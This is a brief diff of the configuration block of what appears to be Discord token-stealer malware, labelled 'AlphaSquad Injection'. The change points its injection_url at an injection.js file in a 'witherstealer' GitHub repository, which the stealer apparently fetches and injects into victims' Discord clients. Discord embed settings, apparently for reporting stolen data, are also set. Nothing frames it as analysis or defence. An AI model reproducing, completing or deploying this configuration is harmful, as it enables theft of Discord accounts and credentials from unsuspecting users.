@@ -14,7 +14,8 @@ const config = {
   embed_name: 'AlphaSquad Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1287036621480263811/1304164995826843719/oski_bad.png?ex=672e65cd&is=672d144d&hm=1b767cfbab10f1f8ba4267130fc45a3d902e50c0adf780e7a12a61ad91c21d7f&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://github.com/witherstealer/dcinj/', 
+  injection_url: 'https://github.com/witherstealer/dcinj/blob/main/injection.js
+    ', 
   /**
    
    **/
